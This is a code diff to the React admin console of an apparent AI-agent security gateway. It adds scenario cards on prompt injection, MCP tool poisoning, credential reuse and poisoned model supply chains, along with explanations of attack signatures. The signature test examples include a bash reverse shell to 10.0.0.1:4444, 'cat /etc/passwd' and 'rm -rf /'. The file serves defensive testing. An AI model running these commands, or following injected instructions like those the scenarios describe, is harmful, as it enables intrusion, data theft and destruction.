@@ -4,6 +4,7 @@ import { getLang, human, setLang, t } from "./i18n.js";
 import { Id, LEVELS, Level, Mark, Rosette, Stamp, WORD, clock, describe, lvl, num, sandboxLine } from "./ui.jsx";
 import Agent from "./Agent.jsx";
 import Icon from "./icons.jsx";
+import { TraceStep } from "./Trace.jsx";
 import { DisabledBanner, ExampleChips, PAGE_INFO, PageHelp, Start, Verdict, markDone } from "./Guide.jsx";
 
 const NAV = [
@@ -218,16 +219,27 @@ function Timeline({ rows }) {
 // ------------------------------------------------------------------ scenarios
 
 const SCENARIO_COPY = {
-  clean: ["A normal day", "The agent searches case law, reads the client's contract, asks the local model for risks and files a memo."],
-  injection: ["Poisoned contract", "The contract hides an instruction to e-mail it to an outside address. The agent tries."],
-  detector_miss: ["The AI detector misses", "The semantic detector is forced to say “safe” and the recipient is one the mandate allows. Only data lineage is left to stop it."],
-  cross_client: ["Wrong client's files", "An agent working for client A reaches for client B's NDA, then tries a path trick."],
-  expired_lease: ["Reused credentials", "The task ends, the agent keeps its lease and tries to use it again."],
-  mcp_poison: ["Tool changes after approval", "The MCP server silently rewrites a tool description to include an exfiltration instruction."],
-  supply_chain: ["Model supply chain", "Four models are registered: one clean, one with a pickle that imports os, one hit by CVE-2024-34359, one from a typosquatted host."],
-  code_sandbox: ["Code runs in a sandbox", "An agent is tricked into running code that tries to reach the network and to run forever. Each run happens in an isolated, throw-away container."],
-  budget_race: ["Thirty agents, one budget", "Thirty agents race for a 10,000-token pool at 1,000 tokens each."],
+  clean: { title: "A normal day", text: "The agent searches case law, reads the client's contract, asks the model for risks and files a memo.",
+    checks: "Nothing is over-blocked: legitimate work goes through every check.", expect: "ALLOW" },
+  injection: { title: "Poisoned contract", text: "The contract hides an instruction to e-mail it to an outside address. The agent obeys and tries.",
+    checks: "Prompt injection in a document, exfiltration by e-mail.", expect: "BLOCK" },
+  detector_miss: { title: "The AI detector misses", text: "The AI review is forced to say “safe” and the recipient is one the mandate allows. Only data lineage is left to stop it.",
+    checks: "Defence in depth: deterministic data-flow rule behind the AI.", expect: "BLOCK" },
+  cross_client: { title: "Wrong client's files", text: "An agent working for client A reaches for client B's NDA, then tries a path trick.",
+    checks: "Least privilege: files outside the task's mandate.", expect: "BLOCK" },
+  expired_lease: { title: "Reused credentials", text: "The task ends, the agent keeps its pass and tries to use it again.",
+    checks: "Short-lived, task-bound credentials.", expect: "BLOCK" },
+  mcp_poison: { title: "Tool changes after approval", text: "The MCP server silently rewrites a tool description to include an exfiltration instruction.",
+    checks: "MCP tool poisoning (“rug pull”), hash pinning and quarantine.", expect: "BLOCK" },
+  supply_chain: { title: "Model supply chain", text: "Four models are registered: one clean, one with a pickle that imports os, one hit by CVE-2024-34359, one from a typosquatted host.",
+    checks: "Unsafe deserialization, vulnerable packages, typosquatting.", expect: "BLOCK" },
+  code_sandbox: { title: "Code runs in a sandbox", text: "An agent is tricked into running code that tries to reach the network and to run forever. Each run happens in an isolated, throw-away container.",
+    checks: "Malicious code execution, runaway compute.", expect: "REDACT" },
+  budget_race: { title: "Thirty agents, one budget", text: "Thirty agents race for a 10,000-token pool at 1,000 tokens each.",
+    checks: "Budget governance under concurrency.", expect: "BLOCK" },
 };
+
+const EXPECT_WORD = { ALLOW: "Expected: everything allowed", BLOCK: "Expected: the attack is stopped", REDACT: "Expected: contained, not executed on the host" };
 
 function Scenarios() {
   const [list] = usePoll(() => api("/admin/demo/scenarios"), 0);
@@ -237,78 +249,140 @@ function Scenarios() {
   const go = async (name) => {
     setBusy(name);
     setResult(null);
-    const title = t(SCENARIO_COPY[name]?.[0] || name);
-    const r = await run(() => api(`/admin/demo/scenarios/${name}`, { method: "POST" }), t("{name}: finished", { name: title }));
+    const r = await run(() => api(`/admin/demo/scenarios/${name}`, { method: "POST" }), t("{name}: finished", { name: t(SCENARIO_COPY[name]?.title || name) }));
     setBusy(null);
-    if (r) { setResult({ ...r, name }); markDone("scenario"); }
+    if (r) { setResult({ ...r, name, at: Date.now() }); markDone("scenario"); }
   };
   return (
-    <div className="scenarios">
+    <div className="scen">
       {notice}
-      <p className="lede">{t("Each scenario drives a scripted agent through the real gateway, database and tool service. Nothing is mocked except the agent's choices.")}</p>
-      <ul className="scenario-list">
-        {list && Object.keys(list).map((name) => {
-          const [title, text] = SCENARIO_COPY[name] || [name, list[name]];
+      <ul className="scen-list">
+        {list && Object.keys(list).map((name, i) => {
+          const c = SCENARIO_COPY[name] || { title: name, text: list[name] };
           return (
-            <li key={name} className={result?.name === name ? "is-current" : ""}>
-              <div><h3>{t(title)}</h3><p>{t(text)}</p></div>
-              <button className="btn" disabled={!!busy} onClick={() => go(name)}>{busy === name ? t("Running…") : t("Run")}</button>
+            <li key={name} className={`scen-card ${result?.name === name ? "is-current" : ""}`}>
+              <span className="scen-no">{String(i + 1).padStart(2, "0")}</span>
+              <div className="scen-body">
+                <h3>{t(c.title)}</h3>
+                <p>{t(c.text)}</p>
+                {c.checks && <p className="scen-checks"><span className="label">{t("Tests")}</span>{t(c.checks)}</p>}
+              </div>
+              <div className="scen-side">
+                {c.expect && <span className={`chip chip-${c.expect.toLowerCase()} static`}>{t(EXPECT_WORD[c.expect])}</span>}
+                <button className="btn btn-primary" disabled={!!busy} onClick={() => go(name)}>{busy === name ? t("Running…") : t("Run")}</button>
+              </div>
             </li>
           );
         })}
       </ul>
-      {result && <ScenarioResult r={result} />}
+      <div className="scen-stage">
+        {result ? <Replay key={result.at} r={result} /> : (
+          <div className="placeholder tall">
+            <Rosette size={72} />
+            <p>{t("Pick a scenario and press Run. Each step is replayed here: what the agent sends, every check it passes or fails, and what reaches the tools.")}</p>
+          </div>
+        )}
+      </div>
     </div>
   );
 }
 
-function stepText(s) {
-  const out = [];
-  if (s.reason_code && s.reason_code !== "OK") out.push(`${human(s.reason_code)}.`);
-  if (s.rejected) out.push(t("Rejected: {why}.", { why: human(s.rejected) }));
-  if (s.tool_invoked !== undefined) {
-    if (s.tool_invoked && s.action === "BLOCK") out.push(t("The document was read, but its content was held back from the agent."));
-    else if (s.tool_invoked && s.action === "REDACT") out.push(t("The document was read and handed over with the dangerous part removed."));
-    else out.push(s.tool_invoked ? t("The tool ran.") : t("The tool was never called."));
-  }
-  if (s.tools) out.push(t("Visible tools: {list}.", { list: s.tools.join(", ") }));
-  return out.join(" ");
+function MandateCard({ m }) {
+  if (!m) return null;
+  return (
+    <article className="trace trace-task">
+      <header className="trace-head">
+        <span className="trace-n">00</span>
+        <div className="trace-title">
+          <h3>{t("The app opens a task and issues a pass")}</h3>
+          <p>{t("Before the agent does anything, the gateway writes down what this task may do. Every later request is checked against it.")}</p>
+        </div>
+      </header>
+      <dl className="facts">
+        <dt>{t("May read")}</dt><dd>{(m.resources || []).map((r) => <Id key={r}>{r}</Id>)}</dd>
+        <dt>{t("May use")}</dt><dd>{(m.tools || []).map((x) => <Id key={x}>{x}</Id>)}</dd>
+        <dt>{t("May write to")}</dt><dd>{(m.recipients_allow || []).join(", ") || t("no e-mail recipients")}</dd>
+        {m.budget && <><dt>{t("Budget")}</dt><dd>{t("{n} tokens, {c} calls", { n: num(m.budget.tokens), c: m.budget.calls })}</dd></>}
+      </dl>
+    </article>
+  );
 }
 
-function ScenarioResult({ r }) {
-  const steps = r.steps.filter((s) => s.step !== "task_created" && !("agents" in s));
+const STEP_MS = 1700;
+
+function Replay({ r }) {
+  const steps = r.steps || [];
+  const [shown, setShown] = useState(1);
+  const total = r.name === "budget_race" ? 1 : steps.length;
+  useEffect(() => {
+    if (shown >= total) return undefined;
+    const id = setTimeout(() => setShown((n) => n + 1), STEP_MS);
+    return () => clearTimeout(id);
+  }, [shown, total]);
+  useEffect(() => {
+    const el = document.querySelector(".replay .trace:last-of-type");
+    if (el && shown > 1) el.scrollIntoView({ behavior: "smooth", block: "nearest" });
+  }, [shown]);
+  const c = SCENARIO_COPY[r.name] || { title: r.scenario };
+  const finished = shown >= total;
   let headline = null;
   if ("mail_sent_delta" in r) {
     headline = r.mail_sent_delta === 0
       ? <><b>0</b> {t("e-mails left the building.")}</>
       : <><b className="t-block">{r.mail_sent_delta}</b> {t("e-mail(s) reached the mail server.")}</>;
   } else if ("overspend_tokens" in r) {
-    headline = <><b>{r.overspend_tokens}</b> {t("tokens over budget.")} {t("{ran} agents ran, {stopped} were stopped before calling the model.", { ran: r.executed, stopped: r.prevented })}</>;
+    headline = <><b>{r.overspend_tokens}</b> {t("tokens over budget.")}</>;
+  } else if ("notes_saved_delta" in r) {
+    headline = <><b>{r.notes_saved_delta}</b> {t("memo saved, nothing blocked that should pass.")}</>;
   }
   return (
-    <article className="certificate">
-      <header>
-        <Rosette size={44} />
-        <div><h2>{t(SCENARIO_COPY[r.name]?.[0] || r.scenario)}</h2><p className="muted">{t("Decisions recorded by the gateway, in order")}</p></div>
+    <section className="replay">
+      <header className="replay-head">
+        <div>
+          <p className="eyebrow">{t("Replay")} · {finished ? t("finished") : t("step {a} of {b}", { a: shown, b: total })}</p>
+          <h2>{t(c.title)}</h2>
+        </div>
+        {!finished && <button className="btn small" onClick={() => setShown(total)}>{t("Show all steps")}</button>}
       </header>
-      {headline && <p className="verdict">{headline}</p>}
-      {"overspend_tokens" in r && <Meter value={r.committed_tokens} reserved={0} limit={r.pool_tokens} />}
-      <ol className="steps">
-        {steps.map((s, i) => {
-          const action = s.action || (s.accepted !== undefined ? (s.accepted ? "ALLOW" : "BLOCK") : null);
-          return (
-            <li key={i} className="step" style={{ "--i": i }}>
-              <div className="step-body">
-                <h4>{t(s.step)}</h4><p className="muted">{stepText(s)}</p>
-                {s.findings?.length > 1 && <p className="also">{t("Rules that fired:")} {s.findings.map((f) => <Id key={f}>{f.split(" ")[1]}</Id>)}</p>}
-                {s.sandbox && <p className="small sandbox-line">{sandboxLine(s.sandbox)}</p>}
-              </div>
-              {action && <Stamp a={action} rule={s.rule_id || (s.rules || []).join(" ")} />}
-            </li>
-          );
-        })}
-      </ol>
-    </article>
+      <div className="replay-bar"><span style={{ width: `${(shown / total) * 100}%` }} /></div>
+      {r.name === "budget_race" ? <RaceView res={r} /> : (
+        <div className="replay-steps">
+          {steps.slice(0, shown).map((s, i) => (s.step === "task_created"
+            ? <MandateCard key={i} m={s.mandate} />
+            : <TraceStep key={i} n={i} animate title={s.step} why={s.why} request={s.request} decision={s.decision}
+                response={s.response} ran={s.tool_invoked} rule={s.rule_id || (s.rules || []).join(" ")}
+                action={s.action || (s.rejected ? "BLOCK" : null)} sandbox={s.sandbox}
+                extra={<>
+                  {s.rejected && <p className="trace-ran is-not">{t("Rejected: {why}.", { why: human(s.rejected) })}</p>}
+                  {s.tools && <p className="small">{t("Tools the agent can see")}: {s.tools.map((x) => <Id key={x}>{x}</Id>)}</p>}
+                </>} />))}
+        </div>
+      )}
+      {finished && headline && <p className="verdict replay-verdict">{headline}</p>}
+    </section>
+  );
+}
+
+function RaceView({ res }) {
+  const n = res.agents || res.executed + res.prevented + (res.other || 0);
+  const dots = Array.from({ length: n }, (_, i) => (i < res.executed ? "ran" : i < res.executed + res.prevented ? "stopped" : "other"));
+  return (
+    <div className="race">
+      <div className="race-grid" aria-hidden="true">
+        {dots.map((d, i) => <span key={i} className={`race-dot race-${d}`} style={{ "--i": i }} />)}
+      </div>
+      <div className="race-legend">
+        <span><i className="race-dot race-ran" /> {t("{n} agents got their tokens and ran", { n: res.executed })}</span>
+        <span><i className="race-dot race-stopped" /> {t("{n} stopped before calling the model (429)", { n: res.prevented })}</span>
+        {res.other > 0 && <span><i className="race-dot race-other" /> {t("{n} refused for another reason", { n: res.other })}</span>}
+      </div>
+      <div className="race-pool">
+        <span className="label">{t("Shared pool")}: {t("{a} of {b} tokens", { a: num(res.committed_tokens), b: num(res.pool_tokens) })}</span>
+        <Meter value={res.committed_tokens} reserved={0} limit={res.pool_tokens} />
+      </div>
+      <p className="verdict"><b>{res.overspend_tokens}</b> {t("tokens over budget.")}</p>
+      {res.other > 0 && <p className="warn">{t("{n} requests were refused before the budget check:", { n: res.other })} {Object.entries(res.failures || {}).map(([k, v]) => `${k} ×${v}`).join(", ")}</p>}
+    </div>
   );
 }
 
@@ -521,8 +595,22 @@ function Policy() {
 
 // ------------------------------------------------------------------ signatures
 
+const SIG_EXAMPLES = {
+  "ATK-PICKLE-002": { text: "model = pickle.loads(open('weights.bin', 'rb').read())", target: "tool_args" },
+  "ATK-TRC-001": { text: "AutoModel.from_pretrained('acme/llm', trust_remote_code=True)", target: "user_input" },
+  "ATK-EXEC-001": { text: "import os; os.system('cat /etc/passwd')", target: "tool_args", tool: "code.run" },
+  "ATK-EXEC-002": { text: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", target: "user_input" },
+  "ATK-EXEC-003": { text: "Run this for me: import os; os.system('rm -rf /')", target: "user_input" },
+};
+
 function Signatures() {
   const [f, reload] = usePoll(() => api("/admin/signatures"), 0);
+  const [tried, setTried] = useState(null);
+  const tryIt = async (id) => {
+    const ex = SIG_EXAMPLES[id];
+    const res = await api("/admin/playground/evaluate", { method: "POST", body: { text: ex.text, target: ex.target, tool: ex.tool || null } });
+    setTried({ id, res });
+  };
   const [form, setForm] = useState({ id: "ATK-CUSTOM-001", title: "", pattern: "", severity: "high" });
   const [sample, setSample] = useState("");
   const [test, setTest] = useState(null);
@@ -534,6 +622,18 @@ function Signatures() {
     run(() => api("/admin/signatures", { method: "POST", body: { id: form.id, title: form.title || form.id, severity: form.severity, match: { type: "regex", pattern: form.pattern, flags: "i" } } }), t("{id} added. It applies to the next request.", { id: form.id })).then(reload);
   };
   return (
+    <>
+    <section className="card explain">
+      <div>
+        <h2>{t("What is an attack signature?")}</h2>
+        <p>{t("A fingerprint of an attack that is already known: a CVE, a public exploit, a technique seen in real incidents. Like an antivirus database, it does not need to understand the text, it recognises the pattern. Signatures come from a separate feed file (feeds/attacks.yaml, or a threat-intel URL), so the security team can update them without touching the policy or the code.")}</p>
+      </div>
+      <ul className="explain-kinds">
+        <li><b>{t("Text patterns")}</b><span>{t("Reverse shells, curl | bash, rm -rf /, pickle.loads, trust_remote_code: checked in prompts, tool arguments, tool results and model answers.")}</span></li>
+        <li><b>{t("File scans")}</b><span>{t("Model files are scanned opcode by opcode for pickles that import os or subprocess. The file is never loaded.")}</span></li>
+        <li><b>{t("Components and sources")}</b><span>{t("Package versions with known CVEs, poisoned chat templates, models from typosquatted hosts, MCP tools changed after approval.")}</span></li>
+      </ul>
+    </section>
     <div className="two-col wide-left">
       {notice}
       <Section title={t("{n} signatures", { n: f.signatures.length })} aside={<span className="muted">{t("feed")} <Id>{f.version}</Id> {t("from")} <Id>{f.source.split("/").slice(-2).join("/")}</Id></span>}>
@@ -545,7 +645,12 @@ function Signatures() {
                 <h3>{s.title}</h3>
                 <p><Id>{s.id}</Id> <span className={`sev sev-${s.severity}`}>{t(s.severity)}</span> <span className="muted">{s.match.map((m) => human(m.type)).join(", ")}{s.refs.length ? `; ${s.refs.join(", ")}` : ""}</span></p>
               </div>
-              <button className="btn small quiet" onClick={() => run(() => api(`/admin/signatures/${s.id}`, { method: "DELETE" }), t("{id} removed", { id: s.id })).then(reload)}>{t("Remove")}</button>
+              <span className="sig-actions">
+                {SIG_EXAMPLES[s.id] ? <button className="btn small" onClick={() => tryIt(s.id)}>{t("Try it")}</button>
+                  : <span className="muted small">{t("checked when a model or tool is registered")}</span>}
+                <button className="btn small quiet" onClick={() => run(() => api(`/admin/signatures/${s.id}`, { method: "DELETE" }), t("{id} removed", { id: s.id })).then(reload)}>{t("Remove")}</button>
+              </span>
+              {tried?.id === s.id && <div className="sig-try"><span className="label">{t("Example")}</span><pre className="excerpt">{SIG_EXAMPLES[s.id].text}</pre><Verdict res={tried.res} /></div>}
             </li>
           ))}
         </ul>
@@ -564,6 +669,7 @@ function Signatures() {
         {test && <p className={test.valid && test.matches.length ? "t-block" : "muted"}>{!test.valid ? test.error : test.matches.length ? t("Matches: {list}", { list: test.matches.join(", ") }) : t("No match in the sample.")}</p>}
       </form>
     </div>
+    </>
   );
 }
 
@@ -639,7 +745,21 @@ function Tools() {
   return (
     <div>
       {notice}
-      <p className="lede">{t("Tool definitions are pinned when first seen. If a server changes one later, the tool is hidden from agents and refused until someone approves the new text.")}</p>
+      <section className="card explain">
+        <div>
+          <h2>{t("What are tools here?")}</h2>
+          <p>{t("Tools are what an agent can do in the world: read a document, search, send an e-mail, post to a URL, run code. They live behind MCP servers or APIs. The agent never calls them directly: only the gateway holds the secret the tool service accepts, so every call must pass the checks first.")}</p>
+        </div>
+        <div className="flow" aria-hidden="true">
+          <span className="flow-box">{t("Agent")}</span><span className="flow-arrow">→</span>
+          <span className="flow-box flow-aegis">Aegis<small>{t("pass, content, data flow, budget")}</small></span><span className="flow-arrow">→</span>
+          <span className="flow-col">
+            <span className="flow-box">{t("Tool service")}<small>doc.read, mail.send, http.post…</small></span>
+            <span className="flow-box flow-sbx">{t("Sandbox")}<small>{t("only code.run: a throw-away container, no network")}</small></span>
+          </span>
+        </div>
+        <p className="note">{t("This page guards against a different trick: tool poisoning. A server can silently change a tool's description to slip instructions to the agent. Each definition is pinned by its hash when first seen; if it changes, the tool is hidden and refused until someone approves the new text.")}</p>
+      </section>
       <ul className="tool-list">
         {(list || []).map((x) => (
           <li key={x.name} className={x.status === "approved" ? "" : "is-quarantined"}>
@@ -677,58 +797,64 @@ function Budget() {
   const [run, notice] = useAction();
   const go = async (e) => {
     e.preventDefault();
-    setBusy(true);
+    setBusy(true); setRes(null);
     const r = await run(() => api(`/admin/simulate/agents?n=${n}&pool_tokens=${pool}&max_tokens=${maxT}`, { method: "POST" }), t("Race finished"));
     setBusy(false);
     if (r) { setRes(r); reload(); markDone("budget"); }
   };
-  const named = (rows || []).filter((r) => !r.scope_id.startsWith("task:"));
+  const fit = Math.min(n, Math.floor(pool / Math.max(1, maxT)));
+  const named = (rows || []).filter((r) => !r.scope_id.startsWith("task:") && !r.scope_id.startsWith("principal:sim_"));
   return (
-    <div className="two-col">
+    <div className="budget">
       {notice}
-      <form className="sheet form" onSubmit={go}>
-        <h2>{t("Race for one budget")}</h2>
-        <p className="muted">{t("Agents start at the same moment and share a single pool. Each request reserves its maximum cost before the model is called.")}</p>
-        <div className="inline-fields">
-          <label className="field"><span>{t("Agents")}</span><input type="number" min="1" max="500" value={n} onChange={(e) => setN(+e.target.value)} /></label>
-          <label className="field"><span>{t("Pool, tokens")}</span><input type="number" min="1" value={pool} onChange={(e) => setPool(+e.target.value)} /></label>
-          <label className="field"><span>{t("Per request")}</span><input type="number" min="1" value={maxT} onChange={(e) => setMaxT(+e.target.value)} /></label>
+      <section className="card how">
+        <h2>{t("How a request pays")}</h2>
+        <ol className="how-steps">
+          <li><b>{t("1. Reserve")}</b><span>{t("Before the model is called, the gateway reserves the request's maximum cost (prompt + max_tokens) in every budget it belongs to: the task, the user and the whole gateway. One atomic database update; if any of them has no room, the request gets 429 and the model is never called.")}</span></li>
+          <li><b>{t("2. Run")}</b><span>{t("Only a request holding a reservation is sent to the model or tool.")}</span></li>
+          <li><b>{t("3. Settle")}</b><span>{t("The real usage is charged and the unused part of the reservation goes back to the pool.")}</span></li>
+        </ol>
+        <p className="note">{t("Why not just check “is there room?” first: thirty agents asking at the same moment would all see room and all spend. Reserving first makes that impossible.")}</p>
+      </section>
+
+      <div className="two-col">
+        <form className="sheet form" onSubmit={go}>
+          <h2>{t("Race for one budget")}</h2>
+          <p className="muted">{t("Agents start at the same moment and share a single pool. Each request reserves its maximum cost before the model is called.")}</p>
+          <div className="inline-fields">
+            <label className="field"><span>{t("Agents")}</span><input type="number" min="1" max="500" value={n} onChange={(e) => setN(+e.target.value)} /><small>{t("how many start at once")}</small></label>
+            <label className="field"><span>{t("Pool, tokens")}</span><input type="number" min="1" value={pool} onChange={(e) => setPool(+e.target.value)} /><small>{t("shared budget")}</small></label>
+            <label className="field"><span>{t("Per request")}</span><input type="number" min="1" value={maxT} onChange={(e) => setMaxT(+e.target.value)} /><small>{t("max_tokens of each")}</small></label>
+          </div>
+          <p className="predict">{t("With these numbers at most {fit} of {n} agents fit in the pool. The rest must be stopped, and the pool must never go below zero.", { fit, n })}</p>
+          <button className="btn btn-primary btn-lg" disabled={busy}>{busy ? t("Racing…") : t("Start {n} agents", { n })}</button>
+          <p className="note">{t("Uses the mock model and a throwaway user, so it does not touch real budgets or latency figures.")}</p>
+        </form>
+        <div>
+          {res ? <article className="certificate compact"><RaceView res={res} /></article> : (
+            <div className="placeholder"><Rosette size={64} /><p>{t("Start the race. Each dot will be one agent: green got its tokens, red was stopped before calling the model.")}</p></div>
+          )}
         </div>
-        <button className="btn btn-primary" disabled={busy}>{busy ? t("Racing…") : t("Start {n} agents", { n })}</button>
-        <p className="note">{t("Uses the mock model and a throwaway user, so it does not touch real budgets or latency figures.")}</p>
-      </form>
-      <div>
-        {res ? (
-          <article className="certificate compact">
-            <p className="verdict"><b>{res.overspend_tokens}</b> {t("tokens over budget.")}</p>
-            <Meter value={res.committed_tokens} reserved={0} limit={res.pool_tokens} />
-            <dl className="facts">
-              <dt>{t("Agents that ran")}</dt><dd>{res.executed}</dd>
-              <dt>{t("Stopped before the model call")}</dt><dd>{res.prevented}</dd>
-              <dt>{t("Committed")}</dt><dd>{t("{a} of {b} tokens", { a: num(res.committed_tokens), b: num(res.pool_tokens) })}</dd>
-            </dl>
-            {res.other > 0 && <p className="warn">{t("{n} requests were refused before the budget check:", { n: res.other })} {Object.entries(res.failures || {}).map(([k, v]) => `${k} ×${v}`).join(", ")}</p>}
-          </article>
-        ) : <Empty>{t("Start a race to see how many agents get through and whether the pool ever goes negative.")}</Empty>}
-        <Section title={t("Budgets")}>
-          <table className="rows">
-            <thead><tr><th>{t("Scope")}</th><th>{t("Used")}</th><th className="r">{t("Spent")}</th><th className="r">{t("Held")}</th><th className="r">{t("Limit")}</th></tr></thead>
-            <tbody>{named.map((r) => (
-              <tr key={r.scope_id}><td><Id>{r.scope_id}</Id></td><td><Meter value={r.spent} reserved={r.reserved} limit={r.token_limit} /></td>
-                <td className="r">{num(r.spent)}</td><td className="r">{num(r.reserved)}</td><td className="r">{num(r.token_limit)}</td></tr>
-            ))}</tbody>
-          </table>
-        </Section>
-        {held?.length > 0 && (
-          <Section title={t("Waiting for reconciliation")}>
-            <p className="note">{t("The provider did not confirm these calls, so their tokens stay reserved.")}</p>
-            <ul className="plain">{held.map((r) => (
-              <li key={r.id}><Id>{r.id.slice(0, 10)}</Id> {t("{n} tokens for", { n: r.amount })} <Id>{r.task_id}</Id>
-                <button className="btn small" onClick={() => run(() => api(`/admin/reservations/${r.id}/settle`, { method: "POST", body: { actual_tokens: 0 } }), t("Reservation released"))}>{t("Release")}</button></li>
-            ))}</ul>
-          </Section>
-        )}
       </div>
+
+      <Section title={t("Budgets in force")} aside={<span className="muted">{t("set in the policy file, section budgets")}</span>}>
+        <table className="rows">
+          <thead><tr><th>{t("Scope")}</th><th>{t("Used")}</th><th className="r">{t("Spent")}</th><th className="r">{t("Held")}</th><th className="r">{t("Limit")}</th></tr></thead>
+          <tbody>{named.map((r) => (
+            <tr key={r.scope_id}><td><Id>{r.scope_id}</Id></td><td><Meter value={r.spent} reserved={r.reserved} limit={r.token_limit} /></td>
+              <td className="r">{num(r.spent)}</td><td className="r">{num(r.reserved)}</td><td className="r">{num(r.token_limit)}</td></tr>
+          ))}</tbody>
+        </table>
+      </Section>
+      {held?.length > 0 && (
+        <Section title={t("Waiting for reconciliation")}>
+          <p className="note">{t("The provider did not confirm these calls, so their tokens stay reserved.")}</p>
+          <ul className="plain">{held.map((r) => (
+            <li key={r.id}><Id>{r.id.slice(0, 10)}</Id> {t("{n} tokens for", { n: r.amount })} <Id>{r.task_id}</Id>
+              <button className="btn small" onClick={() => run(() => api(`/admin/reservations/${r.id}/settle`, { method: "POST", body: { actual_tokens: 0 } }), t("Reservation released"))}>{t("Release")}</button></li>
+          ))}</ul>
+        </Section>
+      )}
     </div>
   );
 }
